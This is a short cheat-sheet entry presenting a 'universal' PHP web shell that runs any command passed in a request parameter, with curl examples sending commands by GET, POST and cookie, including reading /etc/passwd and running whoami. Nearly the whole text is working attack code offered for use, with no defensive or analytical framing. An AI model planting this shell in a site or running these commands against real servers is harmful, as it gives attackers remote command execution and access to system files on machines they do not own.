
## Universal PHP shell

```php
<?php
if(isset($_REQUEST['c'])) {
    system($_REQUEST['c'].' 2>&1');
}
?>
```


`$_REQUEST` is a superglobal array in PHP that merges the contents of `$_GET`, `$_POST`, and `$_COOKIE`.

How to use:

```bash
# URL-encode characters for reliability

#GET
curl "http://example.com/vulnerable.php?c=cat%20/etc/passwd"

#POST
curl -X POST -d "c=whoami" http://example.com/shell.php

#COOKIE
curl --cookie "c=cat /etc/passwd" http://example.com/shell.php

```